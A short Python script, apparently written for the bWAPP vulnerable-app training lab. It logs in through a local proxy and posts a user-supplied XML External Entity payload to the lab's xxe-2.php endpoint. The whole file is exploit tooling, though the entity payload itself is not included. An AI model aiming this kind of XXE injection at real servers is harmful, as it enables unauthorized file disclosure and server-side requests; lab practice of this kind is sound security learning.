#!/usr/bin/python

import requests
import re
import argparse

parser=argparse.ArgumentParser()
parser.add_argument('--url',type=str,required=True)
parser.add_argument('--login',type=str,required=True)
parser.add_argument('--password',type=str,required=True)
parser.add_argument('--security_level',type=str,required=True)
parser.add_argument('--payload',type=str,required=False)
args=parser.parse_args()

proxy={'http':'http://127.0.0.1:8080'}
req=requests.session()
login_data={'login':args.login,'password':args.password,'security_level':args.security_level,'form':'submit'}
res1=req.post(args.url,data=login_data,proxies=proxy)
mtch=re.search("Invalid",res1.text)
if mtch:
    print("login failed. Invalid creds")
else:
    print("login success")

parts=args.url.split('//',1)
host=parts[0]+"//"+parts[1].split('/',1)[0]
print(host)

xxe_body="<reset><login>&example;</login><secret>Any bugs?</secret></reset>"
res2=req.post(host+"/bWAPP/xxe-2.php",data=args.payload+xxe_body,proxies=proxy)
print(res2.text)

